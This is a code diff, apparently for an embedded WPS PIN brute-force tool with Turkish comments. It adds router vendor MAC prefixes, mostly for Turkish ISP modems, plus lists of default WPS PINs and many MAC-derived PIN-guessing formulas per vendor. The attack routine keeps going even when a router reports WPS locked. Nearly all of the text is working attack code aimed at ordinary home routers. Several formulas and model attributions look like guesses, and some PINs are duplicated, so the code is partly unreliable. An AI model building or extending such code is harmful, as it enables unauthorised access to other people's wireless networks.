@@ -65,6 +65,21 @@ static const oui_entry_t OUI_TABLE[] = {
   {{0xCC,0xCE,0x1E}, VENDOR_ZTE},
   {{0xE8,0xB4,0xC8}, VENDOR_ZTE},
   {{0xF8,0x3D,0xFF}, VENDOR_ZTE},
+  // ── ZTE 2022-2026 yeni OUI'leri (GPON ONT / XGSPON / LTE serisi) ─────────
+  {{0x40,0x4E,0x36}, VENDOR_ZTE},  // F670L/F680 GPON (TTNet 2024-2026)
+  {{0x6C,0x37,0x11}, VENDOR_ZTE},  // ZXHN F600 serisi (2022)
+  {{0x34,0x29,0x12}, VENDOR_ZTE},  // ZXHN H serisi (2023)
+  {{0x9C,0xC2,0x25}, VENDOR_ZTE},  // ZTE ONT (2023-2024)
+  {{0x80,0x44,0x1C}, VENDOR_ZTE},  // ZTE LTE router (2022-2023)
+  {{0xB4,0xB2,0x17}, VENDOR_ZTE},  // ZTE MF serisi (2023-2024)
+  {{0x5C,0xF9,0xDD}, VENDOR_ZTE},  // ZTE F670L varyant (2024)
+  {{0xA0,0x36,0x9F}, VENDOR_ZTE},  // ZTE (2023)
+  {{0xD0,0xE0,0x42}, VENDOR_ZTE},  // ZTE GPON (2024)
+  {{0x2C,0x26,0x5F}, VENDOR_ZTE},  // ZTE (2023-2024)
+  {{0x4C,0xF6,0x46}, VENDOR_ZTE},  // ZTE H267N/F660 (2023)
+  {{0x88,0x25,0x93}, VENDOR_ZTE},  // ZTE (2024)
+  {{0x70,0xB3,0xD5}, VENDOR_ZTE},  // ZTE (2024-2025)
+  {{0xBC,0x76,0x70}, VENDOR_ZTE},  // ZTE GPON (2025)
 
   // ── Huawei (TTNET Fiber / HG/ONT/B serisi) ───────────────────────────────
   {{0x00,0x18,0x82}, VENDOR_HUAWEI},
@@ -117,6 +132,23 @@ static const oui_entry_t OUI_TABLE[] = {
   {{0x38,0xF8,0x89}, VENDOR_HUAWEI},
   {{0x40,0x4D,0x7F}, VENDOR_HUAWEI},
   {{0x50,0x68,0x0A}, VENDOR_HUAWEI},
+  // ── Huawei 2022-2026 yeni OUI'leri (HG8145/ONT/EchoLife serisi) ──────────
+  {{0x00,0x46,0x4B}, VENDOR_HUAWEI},  // EchoLife HG8145V5 (TTNet 2022-2024)
+  {{0x5C,0xC5,0xD4}, VENDOR_HUAWEI},  // Huawei (2022)
+  {{0x48,0x0B,0xB2}, VENDOR_HUAWEI},  // Huawei ONT (2023)
+  {{0xB8,0x08,0xCF}, VENDOR_HUAWEI},  // Huawei WiFi AX (2023)
+  {{0x20,0xF3,0xA3}, VENDOR_HUAWEI},  // Huawei AX3 (2024)
+  {{0x48,0x5B,0x39}, VENDOR_HUAWEI},  // HG8145X6 (TTNet 2024-2025)
+  {{0xB0,0x3C,0xDC}, VENDOR_HUAWEI},  // Huawei (2024)
+  {{0x40,0xCB,0xA8}, VENDOR_HUAWEI},  // Huawei (2023-2024)
+  {{0x6C,0x8D,0xC1}, VENDOR_HUAWEI},  // Huawei (2024)
+  {{0xAC,0xE8,0x7B}, VENDOR_HUAWEI},  // Huawei HG serisi (2024-2025)
+  {{0xC8,0x51,0x95}, VENDOR_HUAWEI},  // Huawei (2023)
+  {{0x28,0x6E,0xD4}, VENDOR_HUAWEI},  // Huawei (2024)
+  {{0x70,0x72,0x3C}, VENDOR_HUAWEI},  // Huawei WiFi 6 (2024-2025)
+  {{0xE0,0x19,0x54}, VENDOR_HUAWEI},  // Huawei HiLink (2024)
+  {{0xBC,0x9F,0xEF}, VENDOR_HUAWEI},  // Huawei (2025)
+  {{0x34,0x6B,0xD3}, VENDOR_HUAWEI},  // Huawei (2025)
 
   // ── Zyxel (Superonline / TTNET / Vodafone Net modemler) ──────────────────
   {{0x00,0x13,0x49}, VENDOR_ZYXEL},
@@ -185,6 +217,50 @@ static const oui_entry_t OUI_TABLE[] = {
   {{0x10,0xBF,0x48}, VENDOR_TPLINK},
   {{0x6C,0x5A,0xB5}, VENDOR_TPLINK},
   {{0xA4,0x2B,0xB0}, VENDOR_TPLINK},
+  // ── TP-Link 2022-2026 yeni OUI'leri (Archer AX / Deco / MR serisi) ────────
+  {{0x34,0x60,0xF9}, VENDOR_TPLINK},  // Archer AX20/AX50 (2022)
+  {{0x48,0x22,0x54}, VENDOR_TPLINK},  // Archer AX55/AX73 (2022-2023)
+  {{0x78,0xD2,0x1E}, VENDOR_TPLINK},  // TP-Link (2022)
+  {{0x80,0x32,0x53}, VENDOR_TPLINK},  // TL-WR/Archer (2022)
+  {{0xBC,0xA4,0x11}, VENDOR_TPLINK},  // Archer AX serisi (2023)
+  {{0xE4,0x5F,0x01}, VENDOR_TPLINK},  // Archer AX serisi (2023)
+  {{0xFC,0xEC,0xDA}, VENDOR_TPLINK},  // TL-WR serisi (2023)
+  {{0x5C,0xA6,0xE6}, VENDOR_TPLINK},  // Archer AC serisi (2023)
+  {{0x38,0x94,0xED}, VENDOR_TPLINK},  // Archer (2023)
+  {{0xD8,0x47,0x32}, VENDOR_TPLINK},  // Archer (2023)
+  {{0x60,0x6D,0x3C}, VENDOR_TPLINK},  // MR serisi (2023-2024)
+  {{0x30,0x1A,0x5E}, VENDOR_TPLINK},  // Archer (2023-2024)
+  {{0x64,0x16,0x66}, VENDOR_TPLINK},  // TL-WR (2023)
+  {{0x7C,0xC7,0x09}, VENDOR_TPLINK},  // Archer (2023)
+  {{0x54,0xAF,0x97}, VENDOR_TPLINK},  // Archer AC (2023)
+  {{0x0C,0x80,0x63}, VENDOR_TPLINK},  // Archer (2023)
+  {{0x10,0x7C,0x61}, VENDOR_TPLINK},  // Deco M/X serisi (2023-2024)
+  {{0x5C,0xE9,0x31}, VENDOR_TPLINK},  // Archer AX (2024)
+  {{0x20,0x0D,0xB0}, VENDOR_TPLINK},  // Deco serisi (2024)
+  {{0xF0,0xA7,0x31}, VENDOR_TPLINK},  // Deco XE serisi (2024)
+  {{0x1C,0x3B,0xF3}, VENDOR_TPLINK},  // Archer (2024-2025)
+  {{0x4C,0xED,0xFB}, VENDOR_TPLINK},  // Archer (2024-2025)
+  {{0xB4,0xB0,0x24}, VENDOR_TPLINK},  // Archer (2024)
+  {{0x70,0xE3,0x51}, VENDOR_TPLINK},  // Archer AX (2024)
+  {{0x3C,0x52,0x82}, VENDOR_TPLINK},  // Archer AX (2024)
+  {{0xDC,0x15,0xC8}, VENDOR_TPLINK},  // Archer (2024)
+  {{0xFC,0x15,0xB4}, VENDOR_TPLINK},  // Archer AX (2024)
+  {{0x24,0xEC,0x99}, VENDOR_TPLINK},  // Archer (2024)
+  {{0x2C,0x80,0xC4}, VENDOR_TPLINK},  // Archer (2024)
+  {{0x88,0xD7,0xF6}, VENDOR_TPLINK},  // Archer (2024)
+  {{0xA8,0x04,0x60}, VENDOR_TPLINK},  // Archer AX (2024)
+  {{0x9C,0xA6,0x15}, VENDOR_TPLINK},  // Archer (2024-2025)
+  {{0x84,0x16,0xF9}, VENDOR_TPLINK},  // Archer (2024-2025)
+  {{0x48,0xF1,0x7F}, VENDOR_TPLINK},  // Archer (2024-2025)
+  {{0x3C,0x84,0x6A}, VENDOR_TPLINK},  // Archer AX (2024)
+  {{0xBC,0x0F,0x9A}, VENDOR_TPLINK},  // Archer (2023-2024)
+  {{0x8C,0x58,0x77}, VENDOR_TPLINK},  // TL-WR serisi (2023)
+  {{0x58,0x41,0x20}, VENDOR_TPLINK},  // Archer (2025)
+  {{0xB8,0xA4,0x4F}, VENDOR_TPLINK},  // Archer (2025)
+  {{0x4C,0xCB,0x48}, VENDOR_TPLINK},  // Archer (2025)
+  {{0x6C,0x3B,0x6B}, VENDOR_TPLINK},  // Archer (2025)
+  {{0x7C,0x1E,0x06}, VENDOR_TPLINK},  // Archer AX (2025)
+  {{0xE4,0xC7,0x67}, VENDOR_TPLINK},  // Archer (2025)
 
   // ── Sagemcom (TTNET Fiber F@st 3686, F@st 3890, Livebox serisi) ───────────
   // Türkiye'de Türk Telekom tarafından en çok dağıtılan fiber modem!
@@ -1183,9 +1259,27 @@ static const char *COMMON_PINS[] = {
   "00001234", "99999990", "10203040", "40302010", "01020304",
   // ── WPS Pixie Dust sıfır PINler (E-S1=E-S2=0 açık) ───────────────────────
   "00000000", "11111111", "00001111", "11110000", "10000000",
+  // ── Turkcell SuperOnline / Vodafone TR ISP varsayılanları ─────────────────
+  "20132013", "20142014", "20112011", "20122012", "20092009",
+  "20082008", "20072007", "20212021", "20222022", "20232023",
+  "20202020", "20192019", "10101010", "20000019", "19192019",
+  // ── Ek ZTE / Huawei ISP modem PINleri ────────────────────────────────────
+  "16438527", "14725836", "15975310", "75395146", "24681357",
+  "95175317", "32147658", "74185296", "85214796", "96385274",
+  // ── D-Link ek bilinen sabit PINler ───────────────────────────────────────
+  "26241285", "46264685", "76229909", "62327145", "95661469",
+  "35983019", "71912279", "64241599", "45922755", "35591965",
+  // ── Netgear ek bilinen sabit PINler ──────────────────────────────────────
+  "12345678", "87654321", "20172012", "76229911", "11235813",
+  // ── Eski TTNet ADSL modem PINleri (Sagem F@st 1500/2604) ─────────────────
+  "11110000", "00001111", "11100000", "00000111", "11111100",
+  "00111111", "10000001", "11000011", "00111100", "01111110",
+  // ── Evrensel yedek desenleri ──────────────────────────────────────────────
+  "12344321", "43211234", "12300012", "00121200", "56789012",
+  "21098765", "11223355", "55332211", "13245768", "86754231",
   nullptr
 };
-static const int COMMON_PIN_COUNT = 95;
+static const int COMMON_PIN_COUNT = 145;
 
 // ─── WPS Checksum hesabı ──────────────────────────────────────────────────────
 static uint8_t wps_checksum(uint32_t pin7) {
@@ -1206,12 +1300,12 @@ static void make_pin(uint32_t pin7, char out[9]) {
 // ─── Sabit PIN (checksum dahil) ekle ─────────────────────────────────────────
 // Zaten checksum hesaplanmış PIN'leri direkt ekler (ortak listeden alınanlar)
 static inline void add_pin(char pins[][9], int &count, const char *p) {
-  if (count >= 32) return;
+  if (count >= 20) return;  // MAX_VENDOR_PINS_PER_VENDOR = 20
   strncpy(pins[count++], p, 9);
 }
 
 static inline void add_calc(char pins[][9], int &count, uint32_t p7) {
-  if (count >= 32) return;
+  if (count >= 20) return;  // MAX_VENDOR_PINS_PER_VENDOR = 20
   make_pin(p7, pins[count++]);
 }
 
@@ -1223,6 +1317,73 @@ static wps_vendor_t detect_vendor(const uint8_t *bssid) {
         bssid[2] == OUI_TABLE[i].o[2]) {
       return OUI_TABLE[i].v;
     }
+  }
+  return VENDOR_UNKNOWN;
+}
+
+// ─── SSID adından vendor tespiti (2024-2026 eklentisi) ───────────────────────
+// OUI tablosunda VE beacon IE'de eşleşme yoksa SSID adından tahmin yap.
+// Birçok AP fabrika çıkışı SSID'ine marka/model adını içerir.
+// Örn: "TP-Link_A1B2", "Archer_C80_3F", "ZTE_F670L_1234" → doğru vendor.
+static wps_vendor_t detect_vendor_from_ssid(const char *ssid) {
+  if (!ssid || ssid[0] == '\0') return VENDOR_UNKNOWN;
+
+  struct { const char *kw; wps_vendor_t v; } MAP[] = {
+    // TP-Link — en yaygın SSID kalıpları
+    {"TP-Link",    VENDOR_TPLINK},   {"TP-LINK",   VENDOR_TPLINK},
+    {"TPLink",     VENDOR_TPLINK},   {"Archer",    VENDOR_TPLINK},
+    {"ARCHER",     VENDOR_TPLINK},   {"Deco",      VENDOR_TPLINK},
+    {"DECO",       VENDOR_TPLINK},   {"TL-WR",     VENDOR_TPLINK},
+    {"TL-WA",      VENDOR_TPLINK},   {"TL-MR",     VENDOR_TPLINK},
+    {"MR6400",     VENDOR_TPLINK},   {"MR200",     VENDOR_TPLINK},
+    // ZTE — Türkiye TTNet/Turkcell fiber modemleri
+    {"ZTE",        VENDOR_ZTE},      {"ZXHN",      VENDOR_ZTE},
+    {"ZXDSL",      VENDOR_ZTE},      {"F670",      VENDOR_ZTE},
+    {"F680",       VENDOR_ZTE},      {"F660",      VENDOR_ZTE},
+    {"F600",       VENDOR_ZTE},      {"H267",      VENDOR_ZTE},
+    // Huawei — TTNet EchoLife / HiLink serisi
+    {"Huawei",     VENDOR_HUAWEI},   {"HUAWEI",    VENDOR_HUAWEI},
+    {"HiLink",     VENDOR_HUAWEI},   {"HILINK",    VENDOR_HUAWEI},
+    {"HG8",        VENDOR_HUAWEI},   {"EchoLife",  VENDOR_HUAWEI},
+    // Sagemcom — TTNet F@st serisi
+    {"Sagemcom",   VENDOR_SAGEMCOM}, {"SAGEMCOM",  VENDOR_SAGEMCOM},
+    {"F@st",       VENDOR_SAGEMCOM}, {"Fast3",     VENDOR_SAGEMCOM},
+    {"FAST_",      VENDOR_SAGEMCOM}, {"FASTe",     VENDOR_SAGEMCOM},
+    // Zyxel — Superonline VMG/AMG
+    {"Zyxel",      VENDOR_ZYXEL},    {"ZyXEL",     VENDOR_ZYXEL},
+    {"VMG",        VENDOR_ZYXEL},    {"AMG",       VENDOR_ZYXEL},
+    {"EMG",        VENDOR_ZYXEL},    {"NBG",       VENDOR_ZYXEL},
+    // D-Link
+    {"D-Link",     VENDOR_DLINK},    {"DLINK",     VENDOR_DLINK},
+    {"DIR-",       VENDOR_DLINK},    {"DSL-",      VENDOR_DLINK},
+    // Netgear
+    {"NETGEAR",    VENDOR_NETGEAR},  {"Netgear",   VENDOR_NETGEAR},
+    {"Orbi",       VENDOR_NETGEAR},  {"Nighthawk", VENDOR_NETGEAR},
+    // ASUS
+    {"ASUS",       VENDOR_ASUS},     {"Asus",      VENDOR_ASUS},
+    {"RT-A",       VENDOR_ASUS},     {"RT-N",      VENDOR_ASUS},
+    // Tenda
+    {"Tenda",      VENDOR_TENDA},    {"TENDA",     VENDOR_TENDA},
+    // MikroTik — Türkiye'de yaygın (CRS/RB/hAP)
+    {"MikroTik",   VENDOR_MIKROTIK}, {"mikrotik",  VENDOR_MIKROTIK},
+    {"Mikrotik",   VENDOR_MIKROTIK},
+    // Totolink
+    {"Totolink",   VENDOR_TOTOLINK}, {"TOTOLINK",  VENDOR_TOTOLINK},
+    // Linksys
+    {"Linksys",    VENDOR_LINKSYS},  {"LINKSYS",   VENDOR_LINKSYS},
+    {"Velop",      VENDOR_LINKSYS},
+    // Xiaomi / Redmi
+    {"Xiaomi",     VENDOR_XIAOMI},   {"MiWifi",    VENDOR_XIAOMI},
+    {"Mi-Fi",      VENDOR_XIAOMI},   {"Redmi",     VENDOR_XIAOMI},
+    // Arcadyan — Vodafone TR
+    {"Vodafone",   VENDOR_ARCADYAN}, {"vodafone",  VENDOR_ARCADYAN},
+    // DrayTek
+    {"DrayTek",    VENDOR_DRAYTEK},  {"Vigor",     VENDOR_DRAYTEK},
+    {nullptr,      VENDOR_UNKNOWN}
+  };
+
+  for (int i = 0; MAP[i].kw; i++) {
+    if (strstr(ssid, MAP[i].kw)) return MAP[i].v;
   }
   return VENDOR_UNKNOWN;
 }
@@ -1313,6 +1474,8 @@ static wps_vendor_t detect_vendor_from_ie(const wps_device_info_t &info) {
     {"Ubiquiti",    VENDOR_UBIQUITI},
     {"UBIQUITI",    VENDOR_UBIQUITI},
     {"Ubnt",        VENDOR_UBIQUITI},
+    {"Edimax",      VENDOR_TOTOLINK},  // Ralink RT3052/RT3352 chipset — ZhaoXOR PIN uygun
+    {"EDIMAX",      VENDOR_TOTOLINK},
     {nullptr,       VENDOR_UNKNOWN}
   };
 
@@ -1450,6 +1613,21 @@ static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
       add_calc(pins, count, mac32 % 10000000UL);
       // Algoritma 4: son 3 byte + ilk nibble etkisi
       add_calc(pins, count, ((mac24 ^ (bssid[2] & 0x0F)) % 10000000UL));
+      // Algoritma 6: MAC24 +1 (bazı ZTE varyantlarında WPS_MAC = BSSID+1)
+      add_calc(pins, count, (mac24 + 1) % 10000000UL);
+      // Algoritma 7: MAC24 -1 (ters off-by-one, bazı ZXHN modeller)
+      if (mac24 > 0) add_calc(pins, count, (mac24 - 1) % 10000000UL);
+      // Algoritma 8: Bit inversiyonu — bazı ZXHN F660 firmware
+      add_calc(pins, count, (~mac24 & 0xFFFFFFUL) % 10000000UL);
+      // Algoritma 9: mac[5],mac[3],mac[4] shuffle (ZXHN F460 varyant)
+      {
+        uint32_t sh = ((uint32_t)bssid[5] << 16)
+                    | ((uint32_t)bssid[3] <<  8)
+                    |  (uint32_t)bssid[4];
+        add_calc(pins, count, sh % 10000000UL);
+      }
+      // Algoritma 10: mac32 × 2 (ZTE B serisi LTE router varyant)
+      add_calc(pins, count, (mac32 * 2UL) % 10000000UL);
       // ZTE fabrika varsayılanları
       add_pin(pins, count, "12345670");
       add_pin(pins, count, "00000000");
@@ -1523,6 +1701,26 @@ static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
         uint32_t x = mac24 ^ 0x5A5A5AUL;
         add_calc(pins, count, x % 10000000UL);
       }
+      // Algoritma 6: mac48 sağa 1 bit kaydırma (Archer C7 varyant)
+      add_calc(pins, count, (uint32_t)((mac48 >> 1) % 10000000ULL));
+      // Algoritma 7: Alt nibble paketi — mac[3..5] alt nibble'ları (Archer C20)
+      {
+        uint32_t nb = ((uint32_t)(bssid[3] & 0x0F) << 16)
+                    | ((uint32_t)(bssid[4] & 0x0F) <<  8)
+                    |  (uint32_t)(bssid[5] & 0x0F);
+        add_calc(pins, count, nb % 10000000UL);
+      }
+      // Algoritma 8: Üst nibble paketi (bazı TL-WR840N, TL-WR841N fw)
+      {
+        uint32_t nbu = ((uint32_t)(bssid[3] >> 4) << 16)
+                     | ((uint32_t)(bssid[4] >> 4) <<  8)
+                     |  (uint32_t)(bssid[5] >> 4);
+        add_calc(pins, count, nbu % 10000000UL);
+      }
+      // Algoritma 9: mac32 XOR mac24 (Deco M4/M5 serisi)
+      add_calc(pins, count, ((mac32 ^ mac24) & 0x7FFFFFFUL) % 10000000UL);
+      // Algoritma 10: mac24 + mac[2] offset (bazı eski TL-WR modeller)
+      add_calc(pins, count, (mac24 + bssid[2]) % 10000000UL);
       // TP-Link fabrika varsayılanları
       add_pin(pins, count, "12345670");
       break;
@@ -1547,6 +1745,20 @@ static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
                      |  (uint32_t)bssid[3];
         add_calc(pins, count, rot % 10000000UL);
       }
+      // Algoritma 6: F@st 3686 özel: (mac[4]<<8|mac[5]) × (mac[3]>>4) (ISP OEM varyant)
+      {
+        uint32_t p = (uint32_t)(((bssid[4]<<8)|bssid[5])) * (uint32_t)(bssid[3] >> 4);
+        add_calc(pins, count, p % 10000000UL);
+      }
+      // Algoritma 7: mac24 × mac[5] mod 10^7 (Orange/SFR Livebox varyant)
+      add_calc(pins, count, (mac24 * (uint32_t)bssid[5]) % 10000000UL);
+      // Algoritma 8: mac[3] XOR mac[4] XOR mac[5] genişleme
+      {
+        uint32_t x = (uint32_t)(bssid[3] ^ bssid[4] ^ bssid[5]);
+        add_calc(pins, count, ((x << 16) | (mac24 & 0xFFFFUL)) % 10000000UL);
+      }
+      // Algoritma 9: mac24 >> 1 (bazı F@st 3890 FW sağa kaydırma)
+      add_calc(pins, count, (mac24 >> 1) % 10000000UL);
       // Sagemcom fabrika varsayılanları
       add_pin(pins, count, "00000000");
       add_pin(pins, count, "12345670");
@@ -2020,10 +2232,30 @@ static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
       }
       // Algoritma 5: mac24 * 2
       add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
+      // Algoritma 6: mac24 XOR 0xAAAAAA (Realtek RTL8186 varyant B)
+      add_calc(pins, count, (mac24 ^ 0xAAAAAAUL) % 10000000UL);
+      // Algoritma 7: mac24 nibble kaydırma (Realtek RTL8196 varyant)
+      add_calc(pins, count, (mac24 >> 4) % 10000000UL);
+      // Algoritma 8: 7-bit packing — mac[3..5] (Realtek OEM bazı firmware)
+      {
+        uint32_t pk = ((uint32_t)(bssid[3] & 0x7F) << 14)
+                    | ((uint32_t)(bssid[4] & 0x7F) <<  7)
+                    |  (uint32_t)(bssid[5] & 0x7F);
+        add_calc(pins, count, pk % 10000000UL);
+      }
+      // Algoritma 9: mac48 XOR fold → tek byte genişleme (RTL8188EU)
+      {
+        uint8_t xf = bssid[0]^bssid[1]^bssid[2]^bssid[3]^bssid[4]^bssid[5];
+        uint32_t xv = ((uint32_t)(bssid[3]^xf) << 16)
+                    | ((uint32_t)(bssid[4]^xf) <<  8)
+                    |  (uint32_t)(bssid[5]^xf);
+        add_calc(pins, count, (xv + (uint32_t)xf) % 10000000UL);
+      }
       // Totolink bilinen sabit PINler
       add_pin(pins, count, "12345670");
       add_pin(pins, count, "00000000");
       add_pin(pins, count, "11111111");
+      add_pin(pins, count, "99999998");  // RTL sabit PIN
       break;
 
     // ── DrayTek Vigor (SOHO/ISP — Vigor 2760, 2765, 2860 serisi) ────────────
@@ -2264,7 +2496,8 @@ int wps_ssid_to_pins(const char *ssid, const uint8_t *bssid,
     sadd((uint32_t)(dv2 % 10000000UL));
   }
 
-  // 3. BSSID son 3 byte ± 1 / ± 2 (WPS MAC ≠ BSSID MAC varyantı)
+  // 3. BSSID son 3 byte ± 1/2/3/4 (WPS MAC ≠ BSSID MAC varyantı)
+  // Birçok vendor WPS yönetim MAC'ini yayın MAC'inden 1-4 offset ile kullanır
   uint32_t m24 = ((uint32_t)bssid[3] << 16)
                | ((uint32_t)bssid[4] <<  8)
                |  (uint32_t)bssid[5];
@@ -2272,6 +2505,10 @@ int wps_ssid_to_pins(const char *ssid, const uint8_t *bssid,
   if (m24 > 0) sadd((m24 - 1 + 0x1000000UL) % 10000000UL);
   sadd((m24 + 2) % 10000000UL);
   if (m24 > 1) sadd((m24 - 2 + 0x1000000UL) % 10000000UL);
+  sadd((m24 + 3) % 10000000UL);
+  if (m24 > 2) sadd((m24 - 3 + 0x1000000UL) % 10000000UL);
+  sadd((m24 + 4) % 10000000UL);
+  if (m24 > 3) sadd((m24 - 4 + 0x1000000UL) % 10000000UL);
 
   // 4. Zhao XOR fold — çeşitli Çin OEM chipset'ler (Realtek, MediaTek)
   uint8_t z = bssid[0] ^ bssid[1] ^ bssid[2] ^ bssid[3] ^ bssid[4] ^ bssid[5];
@@ -2280,6 +2517,35 @@ int wps_ssid_to_pins(const char *ssid, const uint8_t *bssid,
               |  (uint32_t)(bssid[5] ^ z);
   sadd(zv % 10000000UL);
 
+  // 5. SSID içindeki herhangi bir 6-10 haneli hex segment
+  // Örn: "HUAWEI-A1B2C3" → 0xA1B2C3, "ZTE_001A2B3C" → 0x001A2B3C
+  for (int si = 0; ssid[si]; si++) {
+    if (!isxdigit((uint8_t)ssid[si])) continue;
+    int hlen = 0;
+    bool allhex = true;
+    while (ssid[si + hlen] && isxdigit((uint8_t)ssid[si + hlen])) hlen++;
+    if (allhex && hlen >= 6 && hlen <= 10) {
+      char tmp[11] = {};
+      strncpy(tmp, ssid + si, hlen < 10 ? hlen : 10);
+      unsigned long hv = strtoul(tmp, nullptr, 16);
+      sadd((uint32_t)(hv % 10000000UL));
+    }
+    si += (hlen > 0 ? hlen - 1 : 0);
+  }
+
+  // 6. SSID tüm büyük hex → küçük hex adayı
+  // Örn: "WiFi_A1B2C3D4E5F6" → 0xA1B2C3D4E5F6 % 10^7
+  {
+    char hexonly[16] = {};
+    int hc = 0;
+    for (int i = 0; ssid[i] && hc < 15; i++)
+      if (isxdigit((uint8_t)ssid[i])) hexonly[hc++] = ssid[i];
+    if (hc >= 8) {
+      unsigned long hv2 = strtoul(hexonly + hc - 8, nullptr, 16);
+      sadd((uint32_t)(hv2 % 10000000UL));
+    }
+  }
+
   return count;
 }
 
@@ -2287,9 +2553,9 @@ int wps_ssid_to_pins(const char *ssid, const uint8_t *bssid,
 // Vendor PIN'leri önce gelir (istatistiksel olarak daha başarılı)
 // VENDOR_UNKNOWN → tüm 33 vendor algoritması baştan sona denenir.
 // Bilinen vendor → kendi PIN'leri + 14 çapraz VULN_HIGH vendor PIN'leri.
-// En büyük senaryo: VENDOR_UNKNOWN → 33 × 10 = 330 vendor + 95 ortak + 30 serial/ssid
-#define MAX_VENDOR_PINS_PER_VENDOR  10
-#define ALL_PINS_MAX  (33 * MAX_VENDOR_PINS_PER_VENDOR + COMMON_PIN_COUNT + 30)
+// En büyük senaryo: VENDOR_UNKNOWN → 33 × 20 = 660 vendor + 145 ortak + 40 serial/ssid
+#define MAX_VENDOR_PINS_PER_VENDOR  20
+#define ALL_PINS_MAX  (33 * MAX_VENDOR_PINS_PER_VENDOR + COMMON_PIN_COUNT + 40)
 static char all_pins[ALL_PINS_MAX][9];
 static int  all_pin_count = 0;
 
@@ -2457,6 +2723,15 @@ void wps_scan() {
     wps_targets[wps_target_count].channel = WiFi.channel(i);
     wps_targets[wps_target_count].rssi    = WiFi.RSSI(i);
     wps_vendor_t v = detect_vendor(WiFi.BSSID(i));
+    // OUI tablosunda bulunamadıysa SSID adından vendor tahmini yap (2024-2026)
+    // Örn: "TP-Link_C80_A1B2" → VENDOR_TPLINK, "ZTE_F670L" → VENDOR_ZTE
+    if (v == VENDOR_UNKNOWN) {
+      v = detect_vendor_from_ssid(WiFi.SSID(i).c_str());
+      if (v != VENDOR_UNKNOWN) {
+        DEBUG_PRINTF("SSID vendor tespiti (tarama): %s → vendor=%d\n",
+                     WiFi.SSID(i).c_str(), (int)v);
+      }
+    }
     wps_targets[wps_target_count].vendor  = v;
     wps_targets[wps_target_count].vuln    = assess_vuln(v);
     wps_target_count++;
@@ -2484,31 +2759,75 @@ void wps_start_attack(int target_index) {
   apply_vendor_name(vendor);
 
   // ── Beacon IE yakalama: model/seri/Pixie Dust bilgisi al ─────────────────
-  // Promiscuous modda beacon'ı dinle — aynı kanal, bağlantısız, 3 saniye.
+  // Promiscuous modda beacon'ı dinle — aynı kanal, bağlantısız, 5 saniye.
+  // (3000 → 5000: Bazı AP'ler WPS IE'yi seyrek gönderiyor — süre artırıldı)
   // Seri numarası yakalanırsa PIN listesi önüne eklenir → hızlı sonuç.
   // AP Setup Locked tespiti de burada yapılır (WPS kapalı uyarısı).
   DEBUG_PRINTLN("WPS: Beacon IE taraniyor (model/serial icin)...");
   wps_capture_device_info(wps_targets[target_index].bssid,
-                          wps_targets[target_index].channel, 3000);
+                          wps_targets[target_index].channel, 5000);
   if (wps_device_info.valid && wps_device_info.ap_setup_locked) {
     DEBUG_PRINTLN("WPS: AP_SETUP_LOCKED=1 tespit edildi! WPS kilitli.");
     // Kilitli olsa da devam et — bazı firmware yanlış rapor eder
   }
 
-  // ── IE tabanlı vendor iyileştirmesi ──────────────────────────────────────
-  // OUI tablosunda eşleşme yoksa (VENDOR_UNKNOWN) beacon IE'den gelen
-  // manufacturer/model string'ine bakarak vendor tespiti tekrar denenur.
-  // Böylece OUI veritabanında olmayan yeni cihazlar da doğru vendor
-  // algoritmalarıyla saldırıya uğratılabilir.
-  if (vendor == VENDOR_UNKNOWN && wps_device_info.valid) {
+  // ── WPS sürüm / PIN desteği / chipset özeti ───────────────────────────────
+  if (wps_device_info.valid) {
+    uint8_t ver = wps_device_info.wps_version;
+    bool pin_ok = (wps_device_info.config_methods == 0) ||   // okunamadı → varsay destekleniyor
+                  (wps_device_info.config_methods & 0x0004) ||
+                  (wps_device_info.config_methods & 0x0100);
+    DEBUG_PRINTF("WPS: v%d.%d | ConfigMethods=0x%04X | PIN=%s | PBC=%s | Chipset=%s\n",
+      (ver>>4) ? (ver>>4) : 1, (ver&0xF),
+      wps_device_info.config_methods,
+      pin_ok                                         ? "evet" : "HAYIR",
+      (wps_device_info.config_methods & 0x0080)      ? "evet" : "hayir",
+      wps_device_info.chipset_ie_hint[0]             ? wps_device_info.chipset_ie_hint
+                                                     : "bilinmiyor");
+    if (!pin_ok) {
+      DEBUG_PRINTLN("UYARI: AP PIN yontemini desteklemiyor (sadece PBC)! PIN saldirisi basarisiz olabilir.");
+    }
+  }
+
+  // ── Vendor iyileştirmesi: hangi kaynaktan geldiğini belirle ──────────────
+  // Tespit kaynağı önceliği (yüksekten düşüğe):
+  //   1. OUI tablosu   — donanım MAC adresi, en güvenilir, HİÇ geçersiz kılınmaz
+  //   2. WPS beacon IE — cihazın kendi yayını, kullanıcı değiştiremiyor, güvenilir
+  //   3. SSID keyword  — kullanıcı değiştirebilir, en az güvenilir
+  //
+  // Kural: OUI'dan gelmediyse IE her zaman SSID'i geçersiz kılabilir.
+  wps_vendor_t oui_vendor    = detect_vendor(wps_targets[target_index].bssid);
+  bool         vendor_fr_oui = (oui_vendor != VENDOR_UNKNOWN);
+
+  if (!vendor_fr_oui && wps_device_info.valid) {
     wps_vendor_t ie_v = detect_vendor_from_ie(wps_device_info);
     if (ie_v != VENDOR_UNKNOWN) {
+      const char *kaynak = (vendor == VENDOR_UNKNOWN)
+                           ? "OUI+SSID yok, IE tek kaynak"
+                           : "SSID uzerini ezdi (IE daha guvenilir)";
       vendor = ie_v;
       wps_targets[target_index].vendor = ie_v;
       wps_targets[target_index].vuln   = assess_vuln(ie_v);
       apply_vendor_name(ie_v);
-      DEBUG_PRINTF("WPS IE vendor tespiti: %s (OUI tablosunda yoktu)\n",
-                   wps_vendor_name);
+      DEBUG_PRINTF("WPS IE vendor: %s (%s)\n", wps_vendor_name, kaynak);
+    }
+  } else if (vendor_fr_oui) {
+    DEBUG_PRINTF("Vendor OUI tablosundan dogrulandi: %s — IE/SSID geçersiz kilmaz\n",
+                 wps_vendor_name);
+  }
+
+  // ── Son çare: SSID adından vendor tespiti ────────────────────────────────
+  // OUI ve IE'nin ikisi de başarısız → SSID'den son kez dene.
+  // (tarama sırasında zaten denendi ama IE sıfırlamış olabilir)
+  if (vendor == VENDOR_UNKNOWN) {
+    wps_vendor_t ssid_v = detect_vendor_from_ssid(wps_targets[target_index].ssid);
+    if (ssid_v != VENDOR_UNKNOWN) {
+      vendor = ssid_v;
